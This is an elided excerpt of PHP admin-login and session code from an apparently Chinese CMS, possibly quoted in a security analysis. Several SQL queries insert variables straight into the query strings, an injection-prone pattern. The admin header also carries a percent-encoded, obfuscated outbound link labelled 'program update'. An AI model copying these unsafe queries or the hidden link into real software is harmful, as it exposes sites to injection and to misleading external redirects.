...
if(!$memberid || !$curuser->isadmin()){
	...
	$query = $db->query("SELECT * FROM {$tblprefix}asession WHERE mid='$memberid' AND ip='$onlineip' AND dateline>$dateline", 'SILENT');
	if($db->error()){
		...
		if($asession['errorcount'] == -1){
			$db->query("UPDATE {$tblprefix}asession SET dateline='$timestamp' WHERE mid='$memberid' AND ip='$onlineip'", 'UNBUFFERED');
			$aflag = 'on';
		...
		$db->query("DELETE FROM {$tblprefix}asession WHERE (mid='$memberid' AND ip='$onlineip') OR dateline<$dateline",'UNBUFFERED');
...
if($aflag == 'off'){
	...
	if(empty($md5_password) || $md5_password != $curuser->info['password'] || !regcode_pass('admin',empty($regcode) ? '' : trim($regcode))){
		if(!regcode_pass('admin',empty($regcode) ? '' : trim($regcode))){
			...
			$db->query("UPDATE {$tblprefix}asession SET errorcount=errorcount+1 WHERE mid='$memberid' AND ip='$onlineip'");	
		}
		login_msg($errmsg,'','login');
	}else{
		$db->query("UPDATE {$tblprefix}asession SET errorcount='-1' WHERE mid='$memberid' AND ip='$onlineip'");
...
?> | <a href="?entry=extend&extend=memberpw" title="修改个人管理密码" target="main">修改密码</a> | <a href="?entry=logout">退出管理</a> ]</h1>
						<div class="commonActions">
							...
							<div id="checkWidth">
								<ul><?=$usualurlstr?><li><em><a http://%77%77%77%2e%30%37%36%32%76%69%70%2e%63%6f%6d"  target="_blank"><font color="white">&#31243;&#24207;&#26356;&#26032;</font></a></em></li></ul>
							</div>
						</div>
					</div>
				</div>
...
<?
	...
	if($entry == 'logout'){
		$db->query("DELETE FROM {$tblprefix}asession WHERE mid='$memberid' AND ip='$onlineip'");
